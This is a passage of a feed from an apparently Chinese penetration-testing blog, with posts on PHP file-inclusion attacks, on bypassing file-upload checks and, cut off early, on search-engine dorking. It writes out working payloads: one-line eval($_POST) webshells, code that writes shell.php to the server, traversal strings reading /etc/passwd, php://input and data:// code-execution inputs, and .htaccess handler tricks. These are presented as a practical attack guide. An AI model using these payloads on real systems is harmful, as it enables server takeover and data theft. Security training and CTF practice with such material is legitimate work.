class="line">由于包含需要知道包含的文件名。一种方法是进行暴力猜解，linux下使用的随机函数有缺陷，而window下只有65535中不同的文件名，所以这个方法是可行的。另一种方法phpinfo来获取临时文件的路径以及名称,然后临时文件在极短时间被删除的时候,需要竞争时间包含临时文件拿到webshell。</span><br></pre></td></tr></table></figure><h4 id="包含上传文件-图片"><a href="#包含上传文件-图片" class="headerlink" title="包含上传文件(图片)"></a>包含上传文件(图片)</h4><p>很多网站通常会提供文件上传功能，比如：上传头像、文档等，这时就可以采取上传一句话图片木马的方式进行包含。</p><p>图片马的制作方式如下，在cmd控制台下输入：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">进入<span class="number">1.</span>jph和<span class="number">2.</span>php的文件目录后，执行：</span><br><span class="line">copy  <span class="number">1.</span>jpg/b+<span class="number">2.</span>php  <span class="number">3.</span>jpg</span><br><span class="line">将图片<span class="number">1.</span>jpg和包含php代码的<span class="number">2.</span>php文件合并生成图片马<span class="number">3.</span>jpg</span><br></pre></td></tr></table></figure><p>假设已经上传一句话图片木马到服务器，路径为<code>/upload/201811.jpg</code><br>图片代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>fputs(fopen(<span class="string">"shell.php"</span>,<span class="string">"w"</span>),<span class="string">"&lt;?php eval($_POST['pass']);?&gt;"</span>)<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>然后访问URL：<code>http://www.xxxx.com/index.php?page=./upload/201811.jpg</code>，包含这张图片，将会在<code>index.php</code>所在的目录下生成<code>shell.php</code></p><h3 id="有防御的本地文件包含"><a href="#有防御的本地文件包含" class="headerlink" title="有防御的本地文件包含"></a>有防御的本地文件包含</h3><p>文件名后缀固定：在包含的文件名后加固定后缀</p><p>文件名过滤 :使用switch array限制可以包含的文件名</p><p>审计中可见这样的包含模版文件：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $file = $_GET[<span class="string">'file'</span>];</span><br><span class="line">    <span class="keyword">include</span> <span class="string">'/var/www/html/'</span>.$file.<span class="string">'/test/test.php'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这段代码指定了前缀和后缀：这样就很“难”直接去包含前面提到的种种文件。</p><h5 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h5><p>能利用00截断的场景现在应该很少了</p><p>PHP内核是由C语言实现的，因此使用了C语言中的一些字符串处理函数。在连接字符串时，0字节(\x00)将作为字符串的结束符。所以在这个地方，攻击者只要在最后加入一个0字节，就能截断file变量之后的字符串。</p><p><code>?file=../../../../../../../../../etc/passwd%00</code></p><p>文件系统获取含有换行符的文件名，会截断为<code>../../../ect/passwd</code></p><p>(需要 magic_quotes_gpc=off，PHP小于5.3.4有效)</p><h5 id="00截断目录遍历："><a href="#00截断目录遍历：" class="headerlink" title="%00截断目录遍历："></a>%00截断目录遍历：</h5><p><code>?file=../../../../../../../../../var/www/%00</code><br>(需要 magic_quotes_gpc=off，unix文件系统，比如FreeBSD，OpenBSD，NetBSD，Solaris)</p><h5 id="路径长度截断："><a href="#路径长度截断：" class="headerlink" title="路径长度截断："></a>路径长度截断：</h5><p><code>?file=../../../../../../../../../etc/passwd/././././././.[…]/./././././.</code><br>(php版本小于5.2.8可以成功，linux需要文件名长于4096，windows需要长于256)</p><p>利用操作系统对目录最大长度的限制，可以不需要0字节而达到截断的目的。</p><p>我们知道目录字符串，在window下256字节、linux下4096字节时会达到最大值，最大值长度之后的字符将被丢弃。<br>而利用”./“的方式即可构造出超长目录字符串:</p><h5 id="点号截断："><a href="#点号截断：" class="headerlink" title="点号截断："></a>点号截断：</h5><p><code>?file=../../../../../../../../../boot.ini/………[…]…………</code><br>(php版本小于5.2.8可以成功，只适用windows，点号需要长于256)</p><h5 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h5><p>服务器端常常会对于<code>../</code>等做一些过滤，可以用一些编码来进行绕过。下面这些总结来自《白帽子讲Web安全》。</p><ul><li><p>利用url编码</p><ul><li><code>../</code><ul><li><code>%2e%2e%2f</code></li><li><code>..%2f</code></li><li><code>%2e%2e/</code></li></ul></li><li><code>..\</code><ul><li><code>%2e%2e%5c</code></li><li><code>..%5c</code></li><li><code>%2e%2e\</code></li></ul></li></ul></li><li><p>二次编码</p><ul><li><code>../</code><ul><li><code>%252e%252e%252f</code></li></ul></li><li><code>..\</code><ul><li><code>%252e%252e%255c</code></li></ul></li></ul><h5 id="绕过"><a href="#绕过" class="headerlink" title="~绕过"></a><code>~</code>绕过</h5><p>针对目录限制</p><p><code>?file=~/../phpinfo</code>这样的代码。其中<code>~</code>就是尝试是否可以直接跳转到当前硬盘目录。在某些环境下，可达到遍历当前文件目录</p></li></ul><h3 id="二、远程文件包含"><a href="#二、远程文件包含" class="headerlink" title="二、远程文件包含"></a>二、远程文件包含</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=[http|https|ftp]://www.bbb.com/shell.txt（可以有三种，http、https、ftp)</span><br></pre></td></tr></table></figure><h3 id="有防御的远程文件包含"><a href="#有防御的远程文件包含" class="headerlink" title="有防御的远程文件包含"></a>有防御的远程文件包含</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    $basePath = $_GET[<span class="string">'path'</span>];</span><br><span class="line">    <span class="keyword">require_once</span> $basePath . <span class="string">"/action/m_share.php"</span>;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>攻击者可以构造类似如下的攻击URL</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/FIleInclude/index.php?path=http://localhost/test/solution.php?</span><br><span class="line">=http://localhost/FIleInclude/index.php?path=http://localhost/test/solution.php%23</span><br></pre></td></tr></table></figure><p>产生的原理:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/?path=http://localhost/test/solution.php?</span><br><span class="line">最终目标应用程序代码实际上执行了:</span><br><span class="line">require_once &quot;http://localhost/test/solution.php?/action/m_share.php&quot;;</span><br><span class="line">(注意，这里很巧妙，问号&quot;?&quot;后面的代码被解释成URL的querystring，这也是一种&quot;截断&quot;思想，和%00一样)</span><br><span class="line">攻击者可以在http://localhost/test/solution.php上模拟出相应的路径，从而使之吻合</span><br></pre></td></tr></table></figure><h3 id="PHP中的封装协议-伪协议"><a href="#PHP中的封装协议-伪协议" class="headerlink" title="PHP中的封装协议(伪协议)"></a>PHP中的封装协议(伪协议)</h3><p><a href="https://www.php.net/manual/zh/wrappers.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/wrappers.php</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">file:<span class="comment">///var/www/html  访问本地文件系统</span></span><br><span class="line">ftp:<span class="comment">//&lt;login&gt;:&lt;password&gt;@&lt;ftpserveraddress&gt;   访问FTP(s) URLs</span></span><br><span class="line">data:<span class="comment">//  数据流</span></span><br><span class="line">http:<span class="comment">// — 访问 HTTP(s) URLs</span></span><br><span class="line">ftp:<span class="comment">// — 访问 FTP(s) URLs</span></span><br><span class="line">php:<span class="comment">// — 访问各个输入/输出流</span></span><br><span class="line">zlib:<span class="comment">// — 压缩流</span></span><br><span class="line">data:<span class="comment">// — Data (RFC 2397)</span></span><br><span class="line">glob:<span class="comment">// — 查找匹配的文件路径模式</span></span><br><span class="line">phar:<span class="comment">// — PHP Archive</span></span><br><span class="line">ssh2:<span class="comment">// — Secure Shell 2</span></span><br><span class="line">rar:<span class="comment">// — RAR</span></span><br><span class="line">ogg:<span class="comment">// — Audio streams</span></span><br><span class="line">expect:<span class="comment">// — 处理交互式的流</span></span><br></pre></td></tr></table></figure><h4 id="利用php流input："><a href="#利用php流input：" class="headerlink" title="利用php流input："></a>利用php流input：</h4><p>利用条件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">allow_url_include = On。</span><br><span class="line"></span><br><span class="line">对allow_url_fopen不做要求。</span><br></pre></td></tr></table></figure><p>构造:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">index.php</span><br><span class="line">?file=php:<span class="comment">//input</span></span><br><span class="line"></span><br><span class="line">POST:</span><br><span class="line"><span class="meta">&lt;?</span> phpinfo();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>结果将在index.php所在文件下的文件shell.php内增加&lt;?php phpinfo();?&gt;一句话</p><h4 id="利用php流filter："><a href="#利用php流filter：" class="headerlink" title="利用php流filter："></a>利用php流filter：</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php:<span class="comment">//filter/convert.base64-encode/resource=index.php</span></span><br></pre></td></tr></table></figure><p>通过指定末尾的文件，可以读取经base64加密后的文件源码，之后再base64解码一下就行。虽然不能直接获取到shell等，但能读取敏感文件危害也是挺大的。</p><p>其他姿势：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?file=php:<span class="comment">//filter/convert.base64-encode/resource=index.php</span></span><br></pre></td></tr></table></figure><p>效果跟前面一样，少了read等关键字。在绕过一些waf时也许有用。</p><h4 id="利用data-URIs："><a href="#利用data-URIs：" class="headerlink" title="利用data URIs："></a>利用data URIs：</h4><p>利用条件：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、php版本大于等于php5<span class="number">.2</span></span><br><span class="line"><span class="number">2</span>、allow_url_fopen = On</span><br><span class="line"><span class="number">3</span>、allow_url_include = On</span><br></pre></td></tr></table></figure><p>利用data://伪协议进行代码执行的思路原理和php://是类似的，都是利用了PHP中的流的概念，将原本的include的文件流重定向到了用户可控制的输入流中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?file=data:text/plain,<span class="meta">&lt;?php</span> phpinfo();<span class="meta">?&gt;</span></span><br><span class="line">?file=data:text/plain;base64,base64编码的payload</span><br><span class="line">index.php?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%<span class="number">2</span>b</span><br><span class="line">加号+的url编码为%<span class="number">2</span>b，PD9waHAgcGhwaW5mbygpOz8+的base64解码为：<span class="meta">&lt;?php</span> phpinfo();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>(需要allow_url_include=On)</p><h4 id="glob-伪协议"><a href="#glob-伪协议" class="headerlink" title="glob://伪协议"></a>glob://伪协议</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">glob:<span class="comment">// 查找匹配的文件路径模式</span></span><br></pre></td></tr></table></figure><h4 id="phar"><a href="#phar" class="headerlink" title="phar://"></a>phar://</h4><p>利用条件：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php版本大于等于php5<span class="number">.3</span><span class="number">.0</span></span><br></pre></td></tr></table></figure><p>理解：</p><p>如果服务器只允许包含.php文件，后台代码为：<code>include(xxx + &#39;.php&#39;);</code>，而这个.php文件不可控。但是我们可以上传一个.txt文件，那么我们可以通过phar伪协议来包含这个文件，而且phar协议不以后缀名判断文件类型，所以我们将我们的test.php木马压缩以后改为a.txt文件上传到服务器上，之后可以构造payload：<code>phar://a.txt/test</code>，服务器拼接以后就成为了：<code>phar://a.txt/test.php</code>，即可成功包含</p><p>姿势：</p><p>假设有个文件phpinfo.txt，其内容为<code>&lt;?php phpinfo(); ?&gt;</code>，打包成zip压缩包</p><p>指定绝对路径</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?file=phar:<span class="comment">//D:/phpStudy/WWW/fileinclude/test.zip/phpinfo.txt</span></span><br></pre></td></tr></table></figure><p>或者使用相对路径（这里test.zip就在当前目录下）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?file=phar:<span class="comment">//test.zip/phpinfo.txt</span></span><br></pre></td></tr></table></figure><h4 id="zip"><a href="#zip" class="headerlink" title="zip://"></a>zip://</h4><p>利用条件：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php版本大于等于php5<span class="number">.3</span><span class="number">.0</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$file = $_GET[<span class="string">'file'</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($file) &amp;&amp; strtolower(substr($file, <span class="number">-4</span>)) == <span class="string">".jpg"</span>)&#123;</span><br><span class="line">    <span class="keyword">include</span>($file);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>截取过来的后面4格字符,判断是不是jpg,如果是jpg才进行包含</p><p>但使用zip协议，需要指定绝对路径，同时将<code>#</code>编码为<code>%23</code>，之后填上压缩包内的文件。</p><p>然后我们构造<code>zip://php.zip#php.jpg</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?file=zip:<span class="comment">//D:\phpStudy\WWW\fileinclude\test.zip%23php.jpg</span></span><br></pre></td></tr></table></figure><p>注意事项：</p> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、若是使用相对路径，则会包含失败。</span><br><span class="line"><span class="number">2</span>、协议原型：zip:<span class="comment">//archive.zip#dir/file.txt</span></span><br><span class="line"><span class="number">3</span>、注意url编码,因为这个<span class="comment">#会和url协议中的#冲突</span></span><br></pre></td></tr></table></figure><h2 id="CTF中的文件包含套路"><a href="#CTF中的文件包含套路" class="headerlink" title="CTF中的文件包含套路"></a>CTF中的文件包含套路</h2><h3 id="php伪协议读取源码"><a href="#php伪协议读取源码" class="headerlink" title="php伪协议读取源码"></a>php伪协议读取源码</h3><p>点击login，发现链接变为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//54.222.188.152:1/index.php</span></span><br><span class="line">?action=login.php</span><br></pre></td></tr></table></figure><p>推测文件包含 访问：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//54.222.188.152:1/index.php</span></span><br><span class="line">POC1:  ?action=php:<span class="comment">//filter/read=convert.base64-encode/resource=login.php  (Base64加密)</span></span><br><span class="line">POC2:  ?action=php:<span class="comment">//filter/resource=login.php  (大多数信息无法直接实现到浏览器)</span></span><br></pre></td></tr></table></figure><h3 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h3><p>任意代码执行:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">index.php</span><br><span class="line">?file=php:<span class="comment">//input</span></span><br><span class="line"></span><br><span class="line">利用post任意代码执行</span><br><span class="line"><span class="meta">&lt;?</span> phpinfo();<span class="meta">?&gt;</span></span><br><span class="line">利用post写shell:</span><br><span class="line"><span class="meta">&lt;?PHP</span> fputs(fopen(<span class="string">'shell.php'</span>,<span class="string">'w'</span>),<span class="string">'&lt;?php @eval($_POST[cmd])?&gt;'</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>文件内容绕过:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">-------文件源码---------</span><br><span class="line"><span class="comment">//test.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">'flag.php'</span>);</span><br><span class="line">$a= $_GET[<span class="string">"a"</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($a)&amp;&amp;(file_get_contents($a,<span class="string">'r'</span>)) === <span class="string">'this is flag'</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"success\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//flag.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$flag = <span class="string">'flag&#123;flag_is_here&#125;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">--------POC---------</span><br><span class="line">tesp.php?a=php:<span class="comment">//input=this is flag</span></span><br></pre></td></tr></table></figure><p>待更新。。。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;原理&quot;&gt;&lt;a href=&quot;#原理&quot; class=&quot;headerlink&quot; title=&quot;原理&quot;&gt;&lt;/a&gt;原理&lt;/h2&gt;&lt;p&gt;文件包含漏洞产生的原因是在通过php函数引入文件时，由于传入的文件名没有经过合理的校验，从而引发了文件的泄漏或者恶意代码的注入&lt;/p&gt;
&lt;p
      
    
    </summary>
    
      <category term="渗透测试" scheme="https:///login546.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="文件包含漏洞" scheme="https:///login546.github.io/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>渗透测试《文件上传》姿势</title>
    <link href="https:///login546.github.io/2019/07/12/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E3%80%8A%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E3%80%8B/"/>
    <id>https:///login546.github.io/2019/07/12/渗透测试《文件上传》/</id>
    <published>2019-07-12T09:34:24.000Z</published>
    <updated>2021-01-22T08:48:08.994Z</updated>
    
    <content type="html"><![CDATA[<p>本篇要介绍的是常见的几种文件上传绕过姿势。</p><h2 id="文件上传校验"><a href="#文件上传校验" class="headerlink" title="文件上传校验"></a>文件上传校验</h2><p>1.前端javascript校验（一般只校验后缀名）</p><p>2.服务端校验</p><p>3.文件头content-type字段校验（image/gif）</p><p>4.文件内容头校验（GIF89a）</p><p>5.后缀名黑名单校验</p><p>6.后缀名白名单校验</p><p>7.WAF设备校验（根据不同的WAF产品而定）</p><p>8.其他绕过方式</p><h3 id="客户端校验"><a href="#客户端校验" class="headerlink" title="客户端校验"></a>客户端校验</h3><p>​           判断方式：上传文件时还未点击上传按钮便弹出对话框，内容如：只允许上传.jpg/.jpeg/.png后缀名的文件，而此时并没有发送数据包。</p><p>绕过方式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1、可以用firebug将form表单中的JS事件删除，这样就可以绕过验证。</span><br><span class="line"></span><br><span class="line">2、利用burp抓包改包，先上传一个gif类型的木马，然后通过burp将其改为asp/php/jsp后缀名即可。</span><br></pre></td></tr></table></figure><h3 id="文件头content-type字段校验"><a href="#文件头content-type字段校验" class="headerlink" title="文件头content-type字段校验"></a>文件头content-type字段校验</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">绕过方式：通过抓包，将content-type字段改为image/gif或者image/png等允许上传的文件类型</span><br></pre></td></tr></table></figure><h3 id="文件内容头校验"><a href="#文件内容头校验" class="headerlink" title="文件内容头校验"></a>文件内容头校验</h3><p>绕过方式：</p><p>在一句话木马前面再加一些图片文件信息，如</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GIF89a<span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[<span class="string">'caidao'</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p> Windows捆绑</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy 1.png /b + 2.php /a 3.png</span><br></pre></td></tr></table></figure><p>常见的文件头对应关系： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">（1）  .JPEG;.JPE;.JPG   ------------    ”JPGGraphic File”</span><br><span class="line">（2）  .gif  --------------      ”GIF 89A”</span><br><span class="line">（3）  .zip  -------------      ”Zip Compressed”</span><br><span class="line">（4）  .doc;.xls;.xlt;.ppt;.apr   --------------      ”MS Compound Document v1 or Lotus Approach APRfile”</span><br></pre></td></tr></table></figure><h3 id="后缀名黑名单校验"><a href="#后缀名黑名单校验" class="headerlink" title="后缀名黑名单校验"></a>后缀名黑名单校验</h3><p>找黑名单扩展名的漏网之鱼 - 比如 asa 和 cer 之类</p><p>可能存在大小写绕过漏洞 - 比如 aSp 和 pHp 之类</p><p>在window下，若文件名以”.”或者空格作为结尾，系统会自动去除”.”与空格， 所以可以上传以“asp.”和“asp_”为扩展名的文件</p><p><a href="https://blog.csdn.net/qq_26090065/article/details/81458937" target="_blank" rel="noopener">0x00截断绕过</a></p><p>IIS6.0解析漏洞</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在网站下建立文件夹的名字为*.asp、*.asa 的文件夹，其目录内的任何扩展名的文件都被IIS当作asp文件来解析并执行。例如创建目录vidun.asp，那么/vidun.asp/f1jpg将被当作asp文件来执行。（Burp抓包后，在目录后面添加文件夹，如upload/1.asp,而文件名还是f1.jpg）</span><br><span class="line">上传一个 名字叫 &quot;vidun.asp;.jpg&quot;的木马文件，该文件可以被当作asp文件解析并执行。</span><br></pre></td></tr></table></figure><p>能被解析的文件扩展名列表：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">jsp  jspx  jspf</span><br><span class="line">asp  asa  cer  aspx</span><br><span class="line">php  php  php3  php4</span><br><span class="line">exe  exee</span><br></pre></td></tr></table></figure><h3 id="后缀名白名单校验"><a href="#后缀名白名单校验" class="headerlink" title="后缀名白名单校验"></a>后缀名白名单校验</h3><h4 id="0x00截断绕过"><a href="#0x00截断绕过" class="headerlink" title="0x00截断绕过"></a>0x00截断绕过</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">此时若在iis6.0，则可以将木马名改为test.asp;1.jpg来上传，从而通过验证</span><br><span class="line">配合解析漏洞</span><br></pre></td></tr></table></figure><h3 id="WAF设备校验"><a href="#WAF设备校验" class="headerlink" title="WAF设备校验"></a>WAF设备校验</h3><p>垃圾数据<br>可以构造一个大文件，前面1M的内容为垃圾内容，后面才是真正的木马内容；</p><p>也可以将垃圾数据放在数据包最开头，这样便可以绕过对文件名的校验。</p><p><a href="https://www.bugbank.cn/api/tweet/5a6c2ee736dd30c2949b96cd/inner?token=d68d087a72c5b96c4aed0a4761b0f8b9" target="_blank" rel="noopener">上传过WAF总结-15种</a></p><h3 id="其他绕过方式"><a href="#其他绕过方式" class="headerlink" title="其他绕过方式"></a>其他绕过方式</h3><p>.htaccess文件攻击</p><p>先上传一个.htaccess文件，通过它调用php解析器去解析一个文件名中只要包含”haha”这个字符串的任意文件，无论扩展名是什么(没有也行)，都会以php的方式来解析</p><p>.haccess文件代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;haha&quot;&gt;</span><br><span class="line"></span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line"></span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>或者如下，上传一个文件名为evil.gif的图片马：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;evil.gif&quot;&gt;</span><br><span class="line"></span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line"></span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>然后再上传haha.png即可</p><p>Apache解析漏洞</p><p>Apache不管文件最后的后缀名是什么 ,只要是.php.*为结尾,就会被apache服务器解析成PHP的文件<br>Apache的Mime.type配置文件定义了Apache能够解析哪些文件的类型。</p><p>当apache遇到xx.php.rar或者Xxx.php.111这些默认没有在mime.types文件定义的都会解析成php的文件。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;本篇要介绍的是常见的几种文件上传绕过姿势。&lt;/p&gt;
&lt;h2 id=&quot;文件上传校验&quot;&gt;&lt;a href=&quot;#文件上传校验&quot; class=&quot;headerlink&quot; title=&quot;文件上传校验&quot;&gt;&lt;/a&gt;文件上传校验&lt;/h2&gt;&lt;p&gt;1.前端javascript校验（一般只校验后缀名
      
    
    </summary>
    
      <category term="渗透测试" scheme="https:///login546.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="文件上传姿势总结" scheme="https:///login546.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/"/>
    
  </entry>
  
  <entry>
    <title>渗透测试《搜索引擎》利用</title>
    <link href="https:///login546.github.io/2019/07/08/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E3%80%8A%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E3%80%8B/"/>
    <id>https:///login546.github.io/2019/07/08/渗透测试《搜索引擎》/</id>
    <published>2019-07-08T10:47:43.000Z</published>
    <updated>2021-01-22T08:48:08.994Z</updated>
    
    <content type="html"><![CDATA[<p>本篇要介绍的搜索引擎包括：Shodan，censys，钟馗之眼，Google，FoFa，Dnsdb等。介绍的内容主要是这几款搜索引擎的一些高级语法，掌握高级语法会让搜索结果更准确。</p><h3 id="Google搜索引擎"><a href="#Google搜索引擎" class="headerlink" title="Google搜索引擎"></a>Google搜索引擎</h3><p>​        这里之所以要介绍google搜索引擎，其中google hacking用来形容google与安全非同寻常的关系。</p><h4 id="google基本语法"><a href="#google基本语法" class="headerlink" title="google基本语法"></a>google基本语法</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Index of/　　使用它可以直接进入网站首页下的所有文件和文件夹中。</span><br><span class="line">intext:　　将返回所有在网页正文部分包含关键词的网页。</span><br><span class="line">intitle:　　将返回所有网页标题中包含关键词的网页。</span><br><span class="line">cache:　　搜索google里关于某些内容的缓存。</span><br><span class="line">define:　　搜索某个词语的定义。</span><br><span class="line">filetype:　　